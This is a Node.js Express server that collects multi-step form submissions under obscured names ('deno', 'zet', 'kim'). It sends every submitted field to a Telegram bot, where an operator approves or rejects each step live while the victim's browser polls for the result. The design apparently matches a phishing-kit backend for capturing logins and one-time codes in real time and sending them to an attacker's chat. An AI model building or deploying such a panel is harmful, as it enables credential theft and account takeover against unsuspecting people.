require("dotenv").config();

const cors = require("cors");
const express = require("express");
const axios = require("axios");
const path = require("path");
const crypto = require("crypto");

const app = express();

app.use(cors({
  origin: "https://ecoll-ins.onrender.com"
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// In-memory storage (replace with a database in production)
const sessions = {};

// ---------- Helpers ----------

async function sendApproval(step, sessionId, data) {
  let text = `📩 New ${step.toUpperCase()} Submission\n\n`;

  for (const [key, value] of Object.entries(data)) {
    text += `${key}: ${value}\n`;
  }

  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: CHAT_ID,
    text,
    reply_markup: {
      inline_keyboard: [[
        {
          text: "✅ Approve",
          callback_data: `approve:${sessionId}:${step}`
        },
        {
          text: "❌ Reject",
          callback_data: `reject:${sessionId}:${step}`
        }
      ]]
    }
  });
}

// ---------- Routes ----------

app.post("/submit/deno", async (req, res) => {

  const sessionId = crypto.randomUUID();

  sessions[sessionId] = {
    status: "pending",
    currentStep: "deno",
    data: {
      deno: req.body
    }
  };

  await sendApproval("deno", sessionId, req.body);

  res.json({
    sessionId,
    message: "Waiting for approval..."
  });

});

app.post("/submit/zet", async (req, res) => {

  const { sessionId } = req.body;

  if (!sessions[sessionId])
    return res.status(404).json({ error: "Session not found" });

  sessions[sessionId].status = "pending";
  sessions[sessionId].currentStep = "zet";
  sessions[sessionId].data.zet = req.body;

  await sendApproval("zet", sessionId, req.body);

  res.json({
    message: "Waiting for approval..."
  });

});

app.post("/submit/kim", async (req, res) => {

  const { sessionId } = req.body;

  if (!sessions[sessionId])
    return res.status(404).json({ error: "Session not found" });

  sessions[sessionId].status = "pending";
  sessions[sessionId].currentStep = "kim";
  sessions[sessionId].data.kim = req.body;

  await sendApproval("kim", sessionId, req.body);

  res.json({
    message: "Waiting for approval..."
  });

});

// Browser checks approval status

app.get("/status/:sessionId", (req, res) => {

  const session = sessions[req.params.sessionId];

  if (!session)
    return res.status(404).json({ error: "Not found" });

  res.json(session);

});

// ---------- Telegram Webhook ----------

app.post("/telegram", (req, res) => {

  const callback = req.body.callback_query;

  if (!callback)
    return res.sendStatus(200);

  const [action, sessionId, step] = callback.data.split(":");

  if (!sessions[sessionId])
    return res.sendStatus(200);

  if (action === "approve") {

    sessions[sessionId].status = "approved";

  } else {

    sessions[sessionId].status = "rejected";

  }

  axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
    callback_query_id: callback.id
  });

  axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    chat_id: callback.message.chat.id,
    message_id: callback.message.message_id,
    reply_markup: {
      inline_keyboard: []
    }
  });

  res.sendStatus(200);

});

// ---------- Start ----------

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
